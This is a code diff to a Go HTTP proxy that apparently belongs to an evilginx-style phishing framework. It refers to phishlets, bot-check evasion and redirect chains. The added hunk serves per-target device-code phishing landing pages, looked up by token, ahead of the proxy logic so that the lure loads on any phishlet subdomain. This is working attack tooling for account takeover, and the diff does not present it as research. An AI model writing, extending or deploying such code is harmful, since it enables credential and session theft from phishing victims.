@@ -191,6 +191,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// mode is enabled and the socket peer is a known Cloudflare edge node.
 			from_ip := GetRealIP(req, p.cfg.GetCloudflareMode())
 
+			// Device-code landing pages (/dc/<token>).
+			// Serve locally before any proxy logic so the page is returned
+			// regardless of which phishlet subdomain the URL uses.
+			if strings.HasPrefix(req.URL.Path, "/dc/") {
+				token := strings.TrimPrefix(req.URL.Path, "/dc/")
+				if tgt := GetTargetByToken(token); tgt != nil {
+					html := DCLandingPage(tgt)
+					return req, goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, html)
+				}
+				return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "not found")
+			}
+
 			// Multi-layer redirect chain hops (/c/<token>).
 			// Must run before bot-check so chain links work for real users.
 			if handled, rq, rs := handleRedirectChainRequest(req, p.cfg.GetRedirectChainSecret()); handled {
